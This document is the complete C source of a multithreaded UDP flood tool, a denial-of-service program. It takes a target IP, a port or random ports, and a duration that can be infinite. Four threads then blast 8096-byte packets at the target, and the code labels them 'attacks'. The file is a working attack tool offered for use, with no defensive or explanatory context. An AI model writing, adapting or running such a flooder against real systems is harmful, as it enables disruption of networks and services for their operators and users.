#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>  // Added for threading

#define PACKET_SIZE 8096
#define NUM_ATTACKS 4  // Number of concurrent attacks

typedef struct {
    char *ip;
    int port;
    int duration;
} AttackParams;

void *udp_flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    struct sockaddr_in target;
    int sock;
    char packet[PACKET_SIZE];

    memset(packet, 0, PACKET_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);

    printf("Flooding %s:%d for %d seconds...\n", params->ip, params->port, params->duration);

    while (params->duration == 0 || time(NULL) - start_time < params->duration) {
        int rand_port = (params->port == 0) ? (rand() % 65032 + 1) : params->port;
        target.sin_port = htons(rand_port);
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        printf("Sent packet to %s:%d\n", params->ip, rand_port);
    }

    close(sock);
    printf("Flooding completed for one thread.\n");
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT (0=random)> <DURATION (0=infinite)>\n", argv[0]);
        return 1;
    }

    pthread_t threads[NUM_ATTACKS];
    AttackParams params = {
        .ip = argv[1],
        .port = atoi(argv[2]),
        .duration = atoi(argv[3])
    };

    // Create multiple threads for concurrent attacks
    for (int i = 0; i < NUM_ATTACKS; i++) {
        if (pthread_create(&threads[i], NULL, udp_flood, (void *)&params) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for all threads to finish (if duration is non-zero)
    for (int i = 0; i < NUM_ATTACKS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All attacks completed.\n");
    return 0;
}